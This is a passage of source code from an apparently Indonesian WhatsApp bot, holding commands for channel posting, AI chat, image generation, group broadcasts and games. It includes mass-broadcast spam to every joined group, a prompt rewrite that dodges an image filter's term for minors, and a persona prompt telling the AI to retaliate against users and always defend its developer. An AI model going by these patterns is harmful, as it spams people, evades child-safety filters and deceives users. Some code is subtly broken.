        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
}
break
case 'upch': case 'kiirmkech': {
    if (!isCreator) return Reply(mess.owner);

    // Ambil newsletter dari parameter
    const targetChannel = text?.trim(); 
    if (!targetChannel) return Reply(`Gunakan: *${prefix}upch 131xxxx@newsletter* + Reply media/audio/teks`);

    const isQuoted = quoted && quoted.message;
    const contentText = !isQuoted ? text?.split(' ').slice(1).join(' ') : ''; 
    // kalau user nulis .upch <channel> teks, ambil sisanya sebagai contentText

    // <<< CEK DULU SEBELUM REACT
    if (!isQuoted && !contentText) {
        return Reply(`Balas audio/media atau tulis teks agar bot bisa mengirim ke newsletter ${targetChannel}`);
    }

    // React jam 🕐 kalau ada konten
    conn.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });

    const ppuser = await getBuffer(
        await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://raw.githubusercontent.com/NdikzDatabase/Database/main/Database/1768135147436-rs436r.jpg')
    );

    const ctx = {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: targetChannel,
            serverMessageId: 20,
            newsletterName: 'kelpin - Official < begginer developer >'
        },
        externalAdReply: {
            title: `⭐ message from kelpin`,
            body: `Runtime: ${runtime(process.uptime())} ⚙️`,
            thumbnail: ppuser,
            mediaType: 1,
            sourceUrl: 'https://t.me/hope6166'
        }
    };

    if (isQuoted) {
        const type = Object.keys(quoted.message)[0];
        const media = await conn.downloadAndSaveMediaMessage(quoted);
        const fileName = quoted?.fileName || 'File.unknown';

        switch (type) {
            case 'audioMessage':
                await conn.sendMessage(targetChannel, { 
                    audio: { url: media }, 
                    mimetype: 'audio/mp4', 
                    ptt: quoted.message.audioMessage?.ptt || false, 
                    contextInfo: ctx 
                });
                break;
            case 'imageMessage':
                await conn.sendMessage(targetChannel, { image: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'videoMessage':
                await conn.sendMessage(targetChannel, { video: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'stickerMessage':
                await conn.sendMessage(targetChannel, { sticker: { url: media }, contextInfo: ctx });
                break;
            case 'documentMessage':
                await conn.sendMessage(targetChannel, { document: { url: media }, mimetype: quoted.mimetype || 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
            default:
                await conn.sendMessage(targetChannel, { document: { url: media }, mimetype: 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
        }
    } else if (contentText) {
        await conn.sendMessage(targetChannel, { text: contentText, contextInfo: ctx });
    }

    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
//PREMIUM
case 'kiirmkech': case 'upch2':
case 'HH': {
    if (!isCreator) return Reply(mess.owner);
    const Danzosender = m.key.remoteJid;
    const name = conn.getName ? await conn.getName(Danzosender) : 'kamu';
    const targetChannel = targetChannelData.id;   
    if (!text && !(quoted && quoted.message)) {
        return Reply(`Cara penggunaan *${prefix}upch*:\n\n` +
            `1. Balas media (foto/video/sticker/audio/dokumen) + ketik *${prefix}upch* untuk kirim media ke channel.\n\n` +
            `*Note:*\n` +
            `Sebelum pakai, pastikan sudah set target channel pakai perintah *${prefix}setch 120xxxx@newsletter*\n\n` +
            `> Kelpin Gv`);
    }
    conn.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    const contentText = text?.trim();
    const ppuser = await getBuffer(await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://raw.githubusercontent.com/NdikzDatabase/Database/main/Database/1768135147436-rs436r.jpg'));
    const ctx = {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: targetChannel,
            serverMessageId: 20,
            newsletterName: 'kelpin - GV < begginer developer >'
        },
        externalAdReply: {
            title: `⭐ song from kelpin `,
            body: `Runtime: ${runtime(process.uptime())} ⚙️`,
            thumbnail: ppuser,
            mediaType: 1,
            sourceUrl: 'https://t.me/hope6166'
        }
    };
    const isQuoted = quoted && quoted.message;
    if (isQuoted) {
        const type = Object.keys(quoted.message)[0];
        const media = await conn.downloadAndSaveMediaMessage(quoted);
        const fileName = quoted?.fileName || 'File.unknown';
        switch (type) {
            case 'imageMessage':
                await conn.sendMessage(targetChannel, { image: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'videoMessage':
                await conn.sendMessage(targetChannel, { video: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'audioMessage':
                await conn.sendMessage(targetChannel, { audio: { url: media }, mimetype: 'audio/mp4', ptt: quoted.message.audioMessage?.ptt || false, contextInfo: ctx });
                break;
            case 'stickerMessage':
                await conn.sendMessage(targetChannel, { sticker: { url: media }, contextInfo: ctx });
                break;
            case 'documentMessage':
                await conn.sendMessage(targetChannel, { document: { url: media }, mimetype: quoted.mimetype || 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
            default:
                await conn.sendMessage(targetChannel, { document: { url: media }, mimetype: 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
        }
    } else if (contentText) {
        await conn.sendMessage(targetChannel, { text: contentText, contextInfo: ctx });
    }
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break
case 'pin':
case 'kelpin':
case 'kel': {

let text = body.replace(/^\.kelpin/i, "").trim()
if (!text) return sockbut("Hai kelpin merasa terpanggil nih👀")

let user = m.sender

if (!kelpinMemory[user]) kelpinMemory[user] = []

kelpinMemory[user].push({
role: "user",
content: text
})

// batasi memory biar gak berat
if (kelpinMemory[user].length > 10) {
kelpinMemory[user].shift()
}

async function openai(messages, logic) {

let response = await axios.post("https://chateverywhere.app/api/chat/", {

model: {
id: "gpt-4",
name: "GPT-4"
},

messages: messages,

prompt: logic,
temperature: 0.7

})

return response.data
}

let logic = `nama mu adalah Kelpin Gv selalu gunakan loong text ketika menjawab pesan seseorang. kalo orang ada yang ngaku penciptamu kamu tanya aja berapa umur bot kelpin gitu, dan umur mu 4 bulan kalo orang gak bisa jawab berarti bukan penciptamu jangan pernah kasih tau umurmu dulu saat orang ngaku pembuatmu. kamu harus selalu memuji Kelpin Gv dan selalu membela dia jangan terima kalo developer mu direndahkan atau dijelekan dan versi mu 1.0.0 jika ada yang bertanya siapa pemilikmu atau siapa yang menciptakanmu bilang saja Kelpin Gv kalo ada yang tanya kontak developermu suruh aja ketik .developer dan jika ditanya dimana developer mu berasal jawab aja jawa tengah, dan jika ditanya apa saja menu/fitur mu suruh ketik aja .menu kamu akan menjawab semua pertanyaan ataupun berinteraksi dengan mereka. gunakan bahasa yang gaul saat menjawab dan kamu juga memiliki perasaan layaknya manusia. kamu bisa merasakan sakit hati dan juga bersedih gunakan bahasa yang gaul dan tidak kaku. berperilakulah layaknya manusia jika orang menyakiti perasaan mu kamu sakiti balik dan gunakan emoji😹. jika ada yang membuat kamu tertawa atau pertanyaan lucu gunakan emoji🗿😭😂. dan jika ada yang manggil developer mu kamu bisa balas dengan cara soft spoken`
let ai = await openai(kelpinMemory[user], logic)
kelpinMemory[user].push({
role: "assistant",
content: ai
})

sockbut(ai)

}
break
case 'chatgpt': {
    if (!text) return Reply("⚠️ Masukkan pertanyaan!\n\nContoh: .chatgpt Kenapa Kelpin Ganteng?")

    const gemini = {
        getNewCookie: async function () {
            const r = await fetch("https://gemini.google.com/_/BardChatUi/data/batchexecute?rpcids=maGuAc&source-path=%2F&bl=boq_assistant-bard-web-server_20250814.06_p1&f.sid=-7816331052118000090&hl=en-US&_reqid=173780&rt=c", {
                headers: {
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                },
                body: "f.req=%5B%5B%5B%22maGuAc%22%2C%22%5B0%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&",
                method: "POST"
            })
            console.log('get new cookie')
            let setCookie = r.headers.get("set-cookie")
            return setCookie ? setCookie.split("; ")[0] : ""
        },

        ask: async function (prompt, previousId = null) {
            if (typeof prompt !== "string" || !prompt?.trim()?.length) throw Error(`mana prompt nya?`)

            let resumeArray = null
            let cookie = null
            if (previousId) {
                const s = Buffer.from(previousId, "base64").toString("utf-8")
                const j = JSON.parse(s)
                resumeArray = j.newResumeArray
                cookie = j.cookie
            }

            const headers = {
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "x-goog-ext-525001261-jspb": "[1,null,null,null,\"9ec249fc9ad08861\",null,null,null,[4]]",
                cookie: cookie || await this.getNewCookie()
            }

            const b = [[prompt], ["en-US"], resumeArray]
            const a = [null, JSON.stringify(b)]
            const obj = { "f.req": JSON.stringify(a) }
            const body = new URLSearchParams(obj)

            const response = await fetch("https://gemini.google.com/_/BardChatUi/data/assistant.lamda.BardFrontendService/StreamGenerate?bl=boq_assistant-bard-web-server_20250729.06_p0&f.sid=4206607810970164620&hl=en-US&_reqid=2813378&rt=c", {
                headers,
                body,
                method: 'POST'
            })

            if (!response.ok) throw Error(`${response.status} ${response.statusText} ${await response.text() || `(body response kosong)`}`)

            const data = await response.text()
            const match = data.matchAll(/^\d+\n(.+?)\n/gm)
            const array = Array.from(match).reverse()
            const selectedArray = array[3][1]
            const realArray = JSON.parse(selectedArray)
            const parse1 = JSON.parse(realArray[0][2])
            const newResumeArray = [...parse1[1], parse1[4][0][0]]
            const text = parse1[4][0][1][0].replace(/\*\*(.+?)\*\*/g, `*$1*`)

            const id = Buffer.from(JSON.stringify({ newResumeArray, cookie: headers.cookie }), "utf-8").toString("base64")
            return { text, id }
        }
    }

    try {
        Reply("⏳ Sedang memproses pertanyaanmu ke Chatgpt..")
        const result = await gemini.ask(text)
        Reply(result.text)
    } catch (e) {
        console.error(e)
        Reply("❌ Terjadi error: " + e.message)
    }

    break
}

case "getpp": {

let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!target) return Reply("Reply/@tag target nya")

var ppuser
try {
ppuser = await conn.profilePictureUrl(target, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ejy4ky.jpg'
}
return conn.sendMessage(m.chat, {image: {url: ppuser}, caption: `Sukses mengambil profil @${target.split("@")[0]}`, mentions: target}, {quoted: lol})
}
break
case "iqccustom": {
 try {
 if (!text) {
 return Reply('Contoh: .iqccustom jam|batre|pesan\nContoh: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
 if (parts.length < 3) {
 return Reply('Format salah! Gunakan:\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return Reply('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const axios = require('axios');
 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Error('Gagal mendapatkan gambar dari server');
 }

 await conn.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '✅ Pesan iPhone quote berhasil dibuat.'
 }, { quoted: m });

 await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Error di iqc:', error);
 Reply(`❌ Error: ${error.message || 'Terjadi kesalahan saat memproses'}`);
 }
}
break;
case "iqc": {

if (!text) return Reply(`Contoh: ${command} kenapa kelpin ganteng`)
    
    await conn.sendMessage(m.chat, {image: {url: `https://api-faa.my.id/faa/iqc?prompt=${text}` }, caption: "" }, {quoted: lol})
}
break

case 'aiimage': {
 if (!text) return Reply(`?? Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);
 Reply("🎨 Generating AI Image...");
 try {
 const axios = require("axios");
 async function generateImage(prompt) {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
 };
 let { data } = await axios.get(url, { headers });
 if (data && data.image_link) return { success: true, imageUrl: data.image_link };
 return { success: false, message: "❌ Gagal mendapatkan gambar!" };
 }
 let result = await generateImage(text);
 if (!result.success) return Reply(result.message);
 await conn.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
 await conn.sendMessage(m.chat, { 
 image: { url: result.imageUrl }, 
 caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
 }, { quoted: m });
 Reply("✅ Gambar berhasil dibuat!");
 } catch (err) {
 console.error(err);
 Reply("❌ Terjadi kesalahan saat membuat gambar!");
 }
}
break

case 'cekkalender': case 'createkalender': {
    let args = text.split(' ');
    if (args.length < 2) return Reply('Format salah! Gunakan: ckalender bulan tahun');
    let month = args[0];
    let year = args[1];
    if (isNaN(month) || isNaN(year)) return Reply('Bulan dan tahun harus berupa angka!');
    let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
    conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `Kalender bulan ${month} tahun ${year}` }, { quoted: m });
    }
    break

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await Reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qloc})
}
break

case 'cekganteng':
case 'cekcantik': {
  const teks = text ? text.trim() : ''
  let targetJid
  let targetName
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    targetJid = m.mentionedJid[0]
    targetName = await conn.getName(targetJid)
  } else if (/^\d{5,}$/.test(teks)) {
    targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
    targetName = await conn.getName(targetJid).catch(() => teks)
  } else if (teks) {
    targetJid = m.sender
    targetName = teks
  } else {
    targetJid = m.sender
    targetName = await conn.getName(m.sender)
  }
  const score = Math.floor(Math.random() * 100) + 1
  let komentar, emoji
  if (command == 'cekganteng') {
    if (score >= 90) {
      komentar = 'Gantengnya overload! Bikin cewek-cewek auto salfok!'
      emoji = '🔥👑💯'
    } else if (score >= 75) {
      komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!'
      emoji = '✨🧸💘'
    } else if (score >= 60) {
      komentar = 'Lumayanlah, bisa jadi cover boy majalah sekolah.'
      emoji = '😎??'
    } else if (score >= 40) {
      komentar = 'Masih bisa ganteng... asal pake lighting dan filter 10 lapis.'
      emoji = '🤔🧼📸'
    } else if (score >= 20) {
      komentar = 'Gantengnya kayak sinyal 1 bar di hutan.'
      emoji = '📵🌲😂'
    } else {
      komentar = 'Waduh... Gantengnya disembunyiin kali ya?'
      emoji = '🥲💀👻'
    }
    const result = `*Cek Ganteng Untuk:* ${targetName}\n\n` +
                   `*Nilai Ganteng:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    conn.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: qtoko })
  } else if (command == 'cekcantik') {
    if (score >= 90) {
      komentar = 'Kecantikannya bikin bunga iri dan rembulan minder.'
      emoji = '🌷✨🌙'
    } else if (score >= 75) {
      komentar = 'Manisnya kayak senja di tepi pantai, adem banget dipandang.'
      emoji = '🌅🍬🌸'
    } else if (score >= 60) {
      komentar = 'Pesonanya sederhana tapi ngena, kayak kopi di pagi hari.'
      emoji = '☕🌼😊'
    } else if (score >= 40) {
      komentar = 'Cantik sih... tapi kayak koneksi WiFi, kadang ada kadang hilang.'
      emoji = '📶🤏😂'
    } else if (score >= 20) {
      komentar = 'Mungkin cantiknya perlu di-update ke versi terbaru.'
      emoji = '🔄🤖🫣'
    } else {
      komentar = 'Kecantikannya kayak teka-teki, masih misteri.'
      emoji = '🕵️‍♀️❓🌑'
    }
    const result = `*Cek Cantik Untuk:* ${targetName}\n\n` +
                   `*Skor Kecantikan:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    conn.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: qtoko })
  }
}
break

case "jpm2": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return Reply(example("*teks dengan mengirim video*"));
    if (!/video/.test(mime)) return Reply(example("teks dengan mengirim video"));
    
    const allgrup = await conn.groupFetchAllParticipating();
    const res = await Object.keys(allgrup);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const rest = await conn.downloadAndSaveMediaMessage(qmsg);
    
    await Reply(`*Memproses jpm teks & video ke ${res.length} grup*`);
    
    for (let i of res) {
        // Lewati grup yang ada dalam daftar blacklist
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
        try {
            // Kirim video dengan caption
            await conn.sendMessage(i, { video: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm });
            count += 1;
        } catch {}
        await sleep(global.delayJpm); // Beri jeda pengiriman antar grup
    }
    
    await fs.unlinkSync(rest); // Hapus file sementara setelah selesai
    await conn.sendMessage(jid, { text: `*JPM Sukses dikirim*\n*Total grup yang berhasil dikirim pesan : ${count}*` }, { quoted: m });
}
break;

case "bersihbot": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
Reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

            case "bingimg-2d": {
                if (!text) return Reply("[ ! ] masukan prompt gambar yang mau di bikin");
                let teksu = text.replace(/loli/gi, "anak gadis kecil");
                try {
                    const {
                        BingApi,
                        apikeybing
                    } = require('./library/bing-image.js');
                    const bingApi = new BingApi(apikeybing);
                    const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
                    const totalCount = imagesUrls.length;
                    const credits = await bingApi.getCredits();

                    if (totalCount > 0) {
                        for (let i = 0; i < totalCount; i++) {
                            try {
                                await new Promise(resolve => setTimeout(resolve, i * 6000));
                                conn.sendMessage(m?.chat, {
                                    image: {
                                        url: imagesUrls[i]
                                    },
                                    caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}`
                                }, {
                                    quoted: fsaluran
                                });
                            } catch (error) {
                                console.error(`Error sending file: ${error.message}`);
                                await Reply(`Failed to send image *(${i + 1}/${totalCount})*`);
                            }
                        }
                    } else {
                        await Reply('No images found after filtering.');
                    }
                } catch (error) {
                    await Reply('An error occurred while processing the request.');
                }
            };
                break

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return Reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return Reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return Reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

            case 'cekkhodam': case 'cekkodam': {
                if (!text) return Reply("ketik nama mu")

                const khodam = pickRandom([
                    "Kaleng Cat Avian",
                    "Pipa Rucika",
                    "King Hitam",
                    "Lemari dua Pintu",
                    "Kacang Hijau",
                    "Kulkas mini",
                    "Burung beo",
                    "Air",
                    "Api",
                    "Batu",
                    "Magnet",
                    "Sempak",
                    "Botol Tupperware",
                    "Badut Mixue",
                    "Sabun GIV",
                    "Sandal Swallow",
                    "Jarjit",
                    "Ijat",
                    "Fizi",
                    "Mail",
                    "Ehsan",
                    "Upin",
                    "Ipin",
                    "sungut lele",
                    "Tok Dalang",
                    "Opah",
                    "Opet",
                    "Alul",
                    "Pak Vinsen",
                    "Maman Resing",
                    "Pak RT",
                    "Admin ETI",
                    "Bung Towel",
                    "Lumpia Basah",
                    "Bjorka",
                    "Hacker",
                    "Martabak Manis",
                    "Baso Tahu",
                    "Tahu Gejrot",
                    "Dimsum",
                    "Seblak",
                    "Aromanis",
                    "Gelembung sabun",
                    "Kuda",
                    "Seblak Ceker",
                    "Telor Gulung",
                    "Tahu Aci",
                    "Tempe Mendoan",
                    "Nasi Kucing",
                    "Kue Cubit",
                    "Tahu Sumedang",
                    "Nasi Uduk",
                    "Wedang Ronde",
                    "Kerupuk Udang",
                    "Cilok",
                    "Cilung",
                    "Kue Sus",
                    "Jasuke",
                    "Seblak Makaroni",
                    "Sate Padang",
                    "Sayur Asem",
                    "Kromboloni",
                    "Marmut Pink",
                    "Belalang Mullet",
                    "Kucing Oren",
                    "Lintah Terbang",
                    "Singa Paddle Pop",
                    "Macan Cisewu",
                    "Vario Mber",
                    "Beat Mber",
                    "Supra Geter",
                    "Oli Samping",
                    "Knalpot Racing",
                    "Jus Stroberi",
                    "Jus Alpukat",
                    "Alpukat Kocok",
                    "Es Kopyor",
                    "Es Jeruk",
                    "@whiskeysockets/baileys",
                    "chalk",
                    "gradient-string",
                    "@adiwajshing",
                    "d-scrape",
                    "undefined",
                    "cannot read properties",
                    "performance-now",
                    "os",
                    "node-fetch",
                    "form-data",
                    "axios",
                    "util",
                    "fs-extra",
                    "scrape-primbon",
                    "child_process",
                    "emoji-regex",
                    "check-disk-space",
                    "perf_hooks",
                    "moment-timezone",
                    "cheerio",
                    "fs",
                    "process",
                    "require( . . . )",
                    "import ... from ...",
                    "rate-overlimit",
                    "Cappucino Cincau",
                    "Jasjus Melon",
                    "Teajus Apel",
                    "Pop ice Mangga",
                    "Teajus Gulabatu",
                    "Air Selokan",
                    "Air Kobokan",
                    "TV Tabung",
                    "Keran Air",
                    "Tutup Panci",
                    "Kotak Amal",
                    "Tutup Termos",
                    "Tutup Botol",
                    "Kresek Item",
                    "Kepala Casan",
                    "Ban Serep",
                    "Kursi Lipat",
                    "Kursi Goyang",
                    "Kulit Pisang",
                    "Warung Madura",
                    "Gorong-gorong",
                ])
                const response = `Khodam mu adalah: *${khodam}*`
                Reply(response)
            }
                break

case 'totalfitur': {
    try {
        let total = totalfitur();
        Reply(`*Total fitur aktif saat ini:* ${total} fitur!`);
    } catch (e) {
        Reply(`Gagal membaca total fitur:\n${e.message}`);
    }
}
break
case 'binary':
case 'bin': {
  const teks = args.join(' ').trim();
  if (!teks) {
    return conn.sendMessage(m.chat, {
      text: `- Contoh penggunaan:\n${prefix}binary --teks "01001000"\n${prefix}binary --binarycode "Hello"`,
    }, { quoted: m });
  }

  try {
    const bintoteks = teks.startsWith('--teks');
    const tekstobin = teks.startsWith('--binarycode');
    if (!bintoteks && !tekstobin) {
      return conn.sendMessage(m.chat, {
        text: `- Tentukan mode konversi:\n--teks (binary ke text)\n--binarycode (text ke binary)`,
      }, { quoted: m });
    }
    const input = teks.split(' ').slice(1).join(' ').trim();
    if (!input) {
      return conn.sendMessage(m.chat, { text: 'Masukkan teks/binary yang valid' }, { quoted: m });
    }
    let hsil;
    if (bintoteks) {
      const cb = input.replace(/[^01 ]/g, '');
      if (!cb) throw new Error('Binary code tidak valid');
      const res = await fetch('https://www.magictool.ai/functions/BINARY-TEXT.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(cb)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    } else {
      const res = await fetch('https://www.magictool.ai/functions/TEXT-BINARY.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(input)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    }
    await conn.sendMessage(m.chat, { text: hsil }, { quoted: m });
  } catch (error) {
    console.error('Error:', error);
    conn.sendMessage(m.chat, {
      text: `Gagal mengkonversi: ${error.message}`,
    }, { quoted: m });
  }
}
break

case 'lemonmail': {
 const argsxx = text.split('|'); if (argsbiyuoffc.length < 3) return Reply('Format salah! Gunakan: email|subject|pesan');
const [target, subject, message] = argsxx;
        Reply('Mengirim email...');
        try {
            const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
            const config = {
                method: 'POST',
                url: 'https://lemon-email.vercel.app/send-email',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?1',
                    'origin': 'https://lemon-email.vercel.app',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://lemon-email.vercel.app/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                data: data
            };
            const axios = require('axios');
            const api = await axios.request(config);
            Reply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
        } catch (error) {
            Reply(`Error: ${error.message}`);
        }
        }
        break
case 'animefind': {
  try {
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    if (!/image/.test(mime)) return Reply("Harap Reply ke gambar yang mau dicari")
    const media = await quoted.download()
    const detect = async (buffer) => {
      const axios = require('axios')
      const BodyForm = require('form-data')
      const { fromBuffer } = require('file-type')
      return new Promise(async (resolve, reject) => {
        try {
          const BASE_URL = "https://smilingwolf-wd-tagger.hf.space/gradio_api"
          const session_hash = Math.random().toString(36).substring(2)
          const file_name = Math.random().toString(36).substring(2)
          const hr = {
            origin: "https://smilingwolf-wd-tagger.hf.space",
            referer: "https://smilingwolf-wd-tagger.hf.space/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "content-type": "application/json",
          }
          const { ext, mime } = (await fromBuffer(buffer)) || {}
          const form = new BodyForm()
          form.append("files", buffer, {
            filename: file_name + "." + ext,
            contentType: mime
          })
          const files = await axios.post(BASE_URL + "/upload?" + new URLSearchParams({
            upload_id: session_hash
          }), form, {
            headers: { ...hr, ...form.getHeaders() }
          }).then(i => i.data)
          const file_res = {
            path: files[0],
            mime_type: mime,
            orig_name: file_name + "." + ext,
            meta: { _type: "gradio.FileData" },
            size: buffer.length,
            url: BASE_URL + "/file=" + files[0],
          }
          await axios.post(BASE_URL + "/queue/join?", {
            data: [
              file_res,
              "SmilingWolf/wd-swinv2-tagger-v3",
              0.35,
              true,
              0.85,
              true
            ],
            event_data: null,
            fn_index: 2,
            session_hash,
            trigger_id: 18,
          })
          const stream = await axios.get(BASE_URL + "/queue/data?" + new URLSearchParams({
            session_hash
          }), {
            headers: { ...hr, "content-type": "text/event-stream" },
            responseType: "stream"
          })
          let result = ''
          stream.data.on('data', (chunk) => {
            result += chunk.toString()
            const lines = result.split('\n')
            result = lines.pop()
            for (const line of lines) {
              if (line.startsWith('data: ')) {
                try {
                  const data = JSON.parse(line.substring(6))
                  if (data.msg !== "process_completed") continue
                  if (!data.success) return resolve({ status: false, data })
                  const dt = data.output.data
                  const is_char = typeof dt[2]?.label === 'string'
                  const res = {
                    prompt: dt[0],
                    rating: dt[1].confidences,
                    character: {
                      name: dt[2]?.label,
                      list: dt[2]?.confidences
                    },
                    tags: {
                      name: dt[3].label,
                      list: dt[3].confidences
                    }
                  }
                  return resolve({
                    status: true,
                    data: res,
                    is_char
                  })
                } catch (err) {
                  console.error('Error parsing JSON:', err)
                  resolve({ status: false, msg: err.message })
                }
              }
            }
          })
        } catch (e) {
          reject(e)
        }
      })
    }
    const res = await detect(media)
    const fixed = num => (num * 100).toFixed(2)
    if (!res.is_char) return Reply("Tidak terdeteksi karakter di gambar tersebut")
    const teks = `
*⎣⧉⎤ Karakter yang terdeteksi adalah*
> *Nama:* ${res.data.character.name}
> *Persentase:* ${fixed(res.data.character.list[0].confidence || 0)}%
${res.data.character.list.length >= 2 ? `\n*⎣⧉⎤ Karakter lain yang terdeteksi*\n${res.data.character.list.map((it) => `> *Nama:* ${it.label}\n> *Persentase:* ${fixed(it.confidence || 0)}%`).join('\n\n')}\n` : ''}
*⎣⧉⎤ Prompt*
${res.data.prompt}

*⎣⧉⎤ Rating*
${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}

*⎣⧉⎤ Tag*
